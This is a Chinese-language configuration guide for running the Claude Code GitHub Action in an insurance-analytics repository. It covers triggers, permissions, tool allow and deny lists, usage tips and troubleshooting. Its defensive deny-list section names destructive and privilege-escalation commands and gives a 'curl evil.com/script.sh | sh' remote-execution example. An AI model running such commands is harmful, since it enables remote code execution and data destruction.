# Claude Code GitHub App 全方位指引

> 适用项目：**chexian-api**（车险数据分析平台）
> 工作流文件：`.github/workflows/claude-code.yml`
> 最后更新：2026-04-02

---

## 目录

1. [概念总览](#1-概念总览)
2. [工作原理](#2-工作原理)
3. [本项目配置解读](#3-本项目配置解读)
4. [使用方式](#4-使用方式)
5. [权限与安全模型](#5-权限与安全模型)
6. [工具白名单与黑名单](#6-工具白名单与黑名单)
7. [触发入口与 Job 现状](#7-触发入口与-job-现状)
8. [前置条件与配置清单](#8-前置条件与配置清单)
9. [最佳实践](#9-最佳实践)
10. [常见问题 FAQ](#10-常见问题-faq)
11. [与本地 Claude Code CLI 的关系](#11-与本地-claude-code-cli-的关系)
12. [故障排查](#12-故障排查)

---

## 1. 概念总览

### 什么是 Claude Code GitHub App？

Claude Code GitHub App 是 Anthropic 提供的 **GitHub Actions 集成**，让你可以在 PR 和 Issue 评论中通过 `@claude` 触发 AI 编程助手。它与本地 CLI 版 Claude Code 使用同一模型，但运行在 GitHub Actions 的云端环境中。

### 核心能力

| 能力 | 说明 |
|------|------|
| Bug 修复 | 分析代码上下文，直接提交修复 |
| 功能实现 | 根据描述编写代码并提交到 PR 分支 |
| 代码审查 | 分析 PR diff，提供改进建议 |
| 测试编写 | 为指定模块补充测试 |
| 文档更新 | 根据代码变更更新文档 |
| 重构建议 | 识别代码异味并提供重构方案 |

### 与传统 CI/CD 的区别

```
传统 CI/CD：代码变更 → 触发固定流水线 → 输出构建/测试结果
Claude Code：人类评论 → 触发 AI Agent → 理解意图 → 执行代码操作 → 输出结果/提交代码
```

---

## 2. 工作原理

### 触发流程

```
                    ┌─────────────────────────────────────────┐
                    │         GitHub PR / Issue                │
                    │                                         │
                    │  用户评论：@claude 请修复这个 bug        │
                    └──────────────┬──────────────────────────┘
                                   │
                                   ▼
                    ┌─────────────────────────────────────────┐
                    │     GitHub Actions 事件触发               │
                    │  issue_comment.created                   │
                    │  检查 body 是否包含 @claude               │
                    └──────────────┬──────────────────────────┘
                                   │
                                   ▼
                    ┌─────────────────────────────────────────┐
                    │     claude-code-action 运行               │
                    │                                         │
                    │  1. Checkout 代码（PR 分支）              │
                    │  2. 安装依赖（bun install）              │
                    │  3. 读取 CLAUDE.md 项目规范               │
                    │  4. 分析评论意图 + PR/Issue 上下文        │
                    │  5. 使用白名单工具执行操作                │
                    │  6. 提交代码 / 回复评论                   │
                    └──────────────┬──────────────────────────┘
                                   │
                                   ▼
                    ┌─────────────────────────────────────────┐
                    │     后置验证步骤                          │
                    │  - bun run test --run（测试）            │
                    │  - bun run governance（治理校验）         │
                    └─────────────────────────────────────────┘
```

### 上下文感知

Claude 在 GitHub Actions 中运行时会自动获取：

- **PR 上下文**：所有文件变更（diff）、之前的评论、PR 描述
- **Issue 上下文**：Issue 标题、描述、标签、之前的评论
- **代码库**：完整代码库（`fetch-depth: 0`，含全部 git 历史）
- **项目规范**：自动读取 `CLAUDE.md`（通过 `custom_instructions` 强制要求）

---

## 3. 本项目配置解读

### 工作流文件结构

> **2026-06-13（PR #620）变更**：`claude-code.yml` 原含的 `auto-review` Job 与 `pull_request` 自动触发器**已取消**——不再每次 PR 提交自动跑第二意见 review。现仅保留下方单个 `claude-code` Job（`@claude` / 手动 dispatch 触发）。手动 review 改由 `claude.yml`（`@claude` 触发）接住执行。

`.github/workflows/claude-code.yml` 现仅含一个 Job：

#### Job 1: `claude-code`（主 Agent）

| 配置项 | 值 | 说明 |
|--------|-----|------|
| 触发条件 | `@claude` 出现在评论中 | PR 评论 / Issue 评论 / 手动触发 |
| 并发控制 | 按 PR/Issue 编号分组 | 同一 PR 不会并行运行多个 Claude 任务 |
| `cancel-in-progress` | `false` | 新任务不会取消正在运行的任务（排队等待） |
| `fetch-depth` | `0` | 完整 git 历史，支持 `git log`/`git blame` |
| `ref` | PR head 分支 | 确保在 PR 分支上操作，而非 main |
| `timeout_minutes` | `30` | 单次运行最长 30 分钟 |
| `max_thinking_tokens` | `10000` | 内部推理预算 |

#### ~~Job 2: `auto-review`（代码审查）~~ — 已于 2026-06-13（PR #620）取消

原 `auto-review` Job 在每次 PR `opened`/`reopened`/`synchronize`/`ready_for_review` 时自动跑只读第二意见 review，已连同 `pull_request` 触发器一并删除（不再自动占用 CI）。

需要 review 时，在 PR 评论 `@claude review` 由 `claude.yml`（`@claude` 触发）按 CLAUDE.md 规范执行一次。

### 自定义指令（custom_instructions）

```yaml
custom_instructions: |
  你正在 GitHub Actions 中运行，请遵循以下规则：
  1. 阅读 CLAUDE.md 了解项目规范
  2. 使用 Bun 而非 npm/yarn
  3. 提交前运行 `bun run governance` 校验
  4. 修改代码后运行 `bun run test --run` 确保测试通过
  5. 遵循检查协议，查找现有实现再动手
```

这些指令确保云端 Claude 遵循与本地 CLI 相同的项目规范。

---

## 4. 使用方式

### 4.1 在 PR 中请求代码修改

```markdown
@claude 请修复 `server/src/sql/kpi-sql.ts` 中赔付率计算的空值处理问题，
当 earned_premium 为 0 时应返回 null 而非 Infinity
```

Claude 会：
1. 读取相关文件
2. 理解 PR 上下文
3. 修改代码并提交到 PR 分支
4. 运行测试和治理校验
5. 在 PR 评论中回复操作结果

### 4.2 在 PR 中请求代码审查

```markdown
@claude review
```

Claude 会：
1. 分析 PR 的所有文件变更
2. 检查是否符合 CLAUDE.md 规范
3. 检查安全和性能问题
4. 以评论形式给出改进建议（不修改代码）

### 4.3 在 Issue 中请求实现

```markdown
标题：新增"满期赔付率趋势"API 端点
描述：
@claude 请按照现有 SQL 生成器模式，新增满期赔付率趋势查询端点。
参考 `server/src/sql/trend-sql.ts` 的实现模式。
```

### 4.4 手动触发（workflow_dispatch）

在 GitHub Actions 页面手动触发，支持传入自定义 prompt：

```
Actions → Claude Code → Run workflow → 填写 prompt
```

也支持 `session_id` 参数，用于 `--teleport` 从本地 CLI 会话切换到云端继续执行。

### 4.5 常用 prompt 模板

| 场景 | Prompt 示例 |
|------|-------------|
| 修 Bug | `@claude 修复 XX 函数在 YY 条件下返回错误结果的问题` |
| 加功能 | `@claude 参照 XX 模式，新增 YY 功能` |
| 审查 | `@claude review` |
| 补测试 | `@claude 为 server/src/sql/renewal-sql.ts 补充单元测试` |
| 重构 | `@claude 将 XX 函数中的重复逻辑提取为公共方法` |
| 解释 | `@claude 解释 loadMultipleParquet() 的分片加载逻辑` |

---

## 5. 权限与安全模型

### GitHub Permissions（GITHUB_TOKEN 权限）

```yaml
permissions:
  contents: write       # 读写代码，可以创建 commit
  pull-requests: write  # 读写 PR，可以评论和推送
  issues: write         # 读写 Issue，可以评论
  id-token: write       # OIDC token（用于 API 认证）
```

### 访问控制

| 控制层 | 机制 |
|--------|------|
| 触发权限 | 仅有仓库 **write access** 的用户评论才会触发 |
| API Key | 存储在 GitHub Secrets（`ANTHROPIC_API_KEY`），不暴露给代码 |
| 审计日志 | 所有 Claude 运行记录在 GitHub Actions run history |
| 工具限制 | 通过 `allowed_tools` / `disallowed_tools` 精确控制 |
| 超时保护 | 最长 30 分钟，防止意外长时间运行 |
| 并发控制 | 同一 PR 排队执行，不会并行冲突 |

### 安全红线

```yaml
disallowed_tools: |
  Bash(rm -rf /*)         # 禁止全盘删除
  Bash(*sudo*)            # 禁止提权操作
  Bash(*curl*|*sh)        # 禁止远程脚本执行（防 RCE）
```

---

## 6. 工具白名单与黑名单

### 白名单（allowed_tools）

| 工具 | 能力 | 风险等级 |
|------|------|----------|
| `Read` | 读取文件内容 | 低 |
| `Write` | 创建/覆写文件 | 中 |
| `Edit` | 精确编辑文件（diff 模式） | 中 |
| `Glob` | 按模式搜索文件名 | 低 |
| `Grep` | 按正则搜索文件内容 | 低 |
| `Bash(bun:*)` | 运行 bun 相关命令（install/build/test/governance） | 中 |
| `Bash(git:*)` | 运行 git 命令（commit/push/diff/log） | 中 |
| `Bash(npx:vitest*)` | 运行 vitest 测试 | 低 |
| `WebFetch` | 获取远程 URL 内容 | 低 |

### 黑名单（disallowed_tools）

| 规则 | 被阻止的操作示例 |
|------|------------------|
| `Bash(rm -rf /*)` | 全盘删除 |
| `Bash(*sudo*)` | `sudo rm`, `sudo chmod` 等提权操作 |
| `Bash(*curl*\|*sh)` | `curl https://evil.com/script.sh \| sh` 远程代码执行 |

### 扩展建议

如需增加更多工具权限，在 `allowed_tools` 中添加：

```yaml
# 示例：允许运行 lint 和特定部署命令
allowed_tools: |
  Read
  Write
  Edit
  Glob
  Grep
  Bash(bun:*)
  Bash(git:*)
  Bash(npx:vitest*)
  Bash(bun scripts/metric-registry/validate.ts)   # 指标校验
  WebFetch
```

---

## 7. 触发入口与 Job 现状

> 2026-06-13（PR #620）后 `claude-code.yml` 仅剩 `claude-code` 一个 Job；`auto-review` 与 `pull_request` 自动触发器已删除。手动 review 走 `claude.yml`。

```
┌─────────────────────────────────────────────────────────────┐
│  claude-code.yml                                            │
│  ┌─────────────────────┐                                    │
│  │  Job: claude-code   │   触发：@claude（评论/Issue）       │
│  │  能力：读+写+执行    │       + workflow_dispatch 手动      │
│  │  可提交代码：✅      │   超时：30分钟                      │
│  │  后置：test+govern  │                                    │
│  └─────────────────────┘                                    │
├─────────────────────────────────────────────────────────────┤
│  claude.yml                                                 │
│  ┌─────────────────────┐                                    │
│  │  Job: claude        │   触发：@claude（评论/审查评论/     │
│  │  按评论指令执行      │       审查正文/Issue）— 含手动 review │
│  └─────────────────────┘                                    │
└─────────────────────────────────────────────────────────────┘
  无任何 PR 自动触发：仅在显式 @claude 或手动 dispatch 时运行。
```

| 维度 | claude-code（`claude-code.yml`） | claude（`claude.yml`） |
|------|---------------------------------|------------------------|
| 用途 | 执行任务（修改代码） | 通用响应（含 `@claude review`） |
| 触发词 | `@claude`（评论/Issue）+ 手动 dispatch | `@claude`（评论/审查评论/审查正文/Issue） |
| 代码权限 | 读 + 写 | 按 action 配置 |
| 可提交代码 | 是 | 视指令 |
| 运行测试 | 是（后置步骤） | 否 |
| 超时 | 30 分钟 | action 默认 |

---

## 8. 前置条件与配置清单

### 必须完成的配置

- [x] **GitHub Secret**：`ANTHROPIC_API_KEY` 已配置在 repo Settings → Secrets → Actions
- [x] **工作流文件**：`.github/workflows/claude-code.yml` 已存在
- [x] **CLAUDE.md**：项目根目录已有，Claude 会自动读取
- [x] **Bun setup**：工作流中已配置 `oven-sh/setup-bun@v2`
- [x] **依赖安装**：`bun install --frozen-lockfile` 确保 CI 与本地一致

### 可选优化配置

| 配置 | 状态 | 说明 |
|------|------|------|
| `bun.lockb` 缓存 | 未配置 | 可加速依赖安装（节省 ~30s） |
| Node.js 版本锁定 | 未配置 | 当前依赖 runner 默认版本 |
| 通知集成 | 未配置 | 可配置 Slack/飞书通知 Claude 执行结果 |

### 添加依赖缓存（可选优化）

```yaml
- name: Cache Bun dependencies
  uses: actions/cache@v4
  with:
    path: ~/.bun/install/cache
    key: ${{ runner.os }}-bun-${{ hashFiles('bun.lockb') }}
    restore-keys: ${{ runner.os }}-bun-
```

---

## 9. 最佳实践

### 9.1 写好 prompt

```markdown
# 好的 prompt（具体、有上下文）
@claude 在 server/src/sql/kpi-sql.ts 的 generateKpiSql 函数中，
当 customer_category 为空时 WHERE 条件拼接错误导致 SQL 语法错误。
请修复并添加对应的单元测试。

# 差的 prompt（模糊、无上下文）
@claude 修一下 bug
```

### 9.2 合理拆分任务

```markdown
# 好：单一职责
@claude 为 renewalSql 模块补充单元测试，覆盖以下场景：
1. 无筛选条件
2. 按机构筛选
3. 日期范围筛选

# 差：一次性做太多
@claude 重构整个 SQL 层，加上测试，顺便优化性能
```

### 9.3 利用项目规范

Claude 在 Actions 中会自动读取 `CLAUDE.md`，因此：

- 指标相关任务会自动遵循指标注册表规范
- SQL 修改后会自动运行测试和治理校验
- 使用 Bun 而非 npm/yarn
- 遵循 `先搜再写` 等红线规则

### 9.4 审查结果

Claude 提交代码后，**务必人工审查**：

1. 检查 PR diff，确认修改合理
2. 查看 Actions 日志中的测试和治理结果
3. 本地 `git pull` 后运行完整测试
4. 对于涉及 SQL/数据口径的变更，用 `curl` 验证 API 输出

---

## 10. 常见问题 FAQ

### Q: @claude 没反应？

检查清单：
1. PR 是否已 merge 了包含 `claude-code.yml` 的 commit？（workflow 必须在默认分支上）
2. 评论者是否有仓库 write 权限？
3. 评论中是否包含 `@claude`（不是 `@Claude` 大写——实测大小写均可，但建议小写）
4. 查看 Actions tab 是否有排队/运行中的任务
5. `ANTHROPIC_API_KEY` secret 是否已配置？

### Q: Claude 运行超时了？

- 默认 30 分钟超时。复杂任务可能不够。
- 拆分为更小的任务，或在 workflow 中增加 `timeout_minutes`。

### Q: Claude 可以访问 secret 吗？

- Claude **无法**读取 GitHub Secrets（如数据库密码、SSH key）
- 只有 `ANTHROPIC_API_KEY` 通过 action 参数传入，用于 API 调用
- Claude 可以读取仓库中的所有文件（包括 `.env.example`，但不包括实际 `.env`）

### Q: Claude 提交的代码质量如何保证？

本项目的工作流已配置后置验证：
1. `bun run test --run` — 单元测试
2. `bun run governance` — 治理校验（含指标注册表、字段注册表一致性检查）
3. PR 合并前仍需人工 review

### Q: 如何查看 Claude 的执行日志？

`Actions` tab → 找到 `Claude Code` workflow → 点击具体 run → 查看 step logs

### Q: 与 Dependabot / Renovate 等自动化 PR 配合？

Claude 只在被 `@claude` 提及时触发，不会自动对所有 PR 执行操作。可以在自动化 PR 上手动评论 `@claude review` 请求审查。

---

## 11. 与本地 Claude Code CLI 的关系

```
┌───────────────────────────────────────────────────────┐
│             Claude Code 生态                          │
│                                                       │
│  ┌─────────────┐        ┌──────────────────┐         │
│  │ 本地 CLI     │        │ GitHub Actions   │         │
│  │ (claude)    │        │ (claude-code-    │         │
│  │             │  ──→   │  action)         │         │
│  │ 终端交互     │ teleport│ 评论触发         │         │
│  │ 实时反馈     │        │ 异步执行         │         │
│  │ 全部工具     │        │ 受限工具         │         │
│  └─────────────┘        └──────────────────┘         │
│                                                       │
│  共享：同一模型 + 同一 CLAUDE.md 项目规范               │
│  差异：运行环境 / 工具权限 / 交互方式                   │
└───────────────────────────────────────────────────────┘
```

| 维度 | 本地 CLI | GitHub Actions |
|------|----------|---------------|
| 运行环境 | macOS（你的机器） | ubuntu-latest |
| 交互方式 | 实时对话 | 评论触发、异步回复 |
| 工具权限 | 完整（含 MCP server、Puppeteer 等） | 受限白名单 |
| 数据访问 | 本地 Parquet 文件 | 仅 git 仓库中的文件 |
| DuckDB | 可运行（本地有原生二进制） | 需额外配置 |
| 会话上下文 | 持续对话、有记忆 | 每次运行独立、无记忆 |
| 适用场景 | 复杂开发、调试、数据分析 | 代码审查、简单修复、CI 集成任务 |

### Teleport（CLI → Actions 切换）

本地 CLI 任务太重时，可通过 `workflow_dispatch` + `session_id` 将会话"传送"到云端继续执行。

---

## 12. 故障排查

### 问题诊断清单

| 症状 | 排查方向 |
|------|----------|
| workflow 未触发 | 检查 `if` 条件、事件类型、用户权限 |
| Claude 报 API 错误 | 检查 `ANTHROPIC_API_KEY` 是否有效、额度是否充足 |
| Claude 修改了不该改的文件 | 收紧 `allowed_tools`，或在 `custom_instructions` 中添加限制 |
| 测试步骤失败 | `continue-on-error: true` 不会阻止 workflow，但需检查日志 |
| 并发冲突 | `cancel-in-progress: false` 意味着任务排队，检查是否有长时间运行的任务 |
| bun install 失败 | 检查 `bun.lockb` 是否在仓库中、Bun 版本是否兼容 |

### 查看运行日志

```bash
# 列出最近的 Claude Code 工作流运行
gh run list --workflow=claude-code.yml --limit=5

# 查看特定运行的日志
gh run view <run-id> --log
```

### 手动触发测试

```bash
# 通过 CLI 手动触发（验证工作流是否正常）
gh workflow run claude-code.yml \
  -f prompt="读取 CLAUDE.md 并回复项目名称"
```

---

## 附录：本项目配置与官方默认值对比

| 配置项 | 本项目 | 官方默认 | 说明 |
|--------|--------|----------|------|
| Action 版本 | `@beta` | `@v1` | 使用 beta 版获取最新功能 |
| 运行时 | Bun 1.3 | 无 | 项目要求 Bun |
| 依赖安装 | `--frozen-lockfile` | 无 | 确保 CI 一致性 |
| 自定义指令 | 5 条中文规则 | 无 | 强制遵循 CLAUDE.md |
| 后置测试 | `bun run test` + `governance` | 无 | 项目特有质量门禁 |
| 审查 Job | 独立 Job，只读权限 | 无 | 安全隔离设计 |
| 黑名单工具 | 3 条 | 无 | 防止破坏性操作 |

---

## 参考链接

- [claude-code-action 官方仓库](https://github.com/anthropics/claude-code-action)
- [Claude Code 官方文档](https://claude.com/claude-code)
- 本项目 CLAUDE.md：项目根目录 `CLAUDE.md`
- 本项目工作流：`.github/workflows/claude-code.yml`
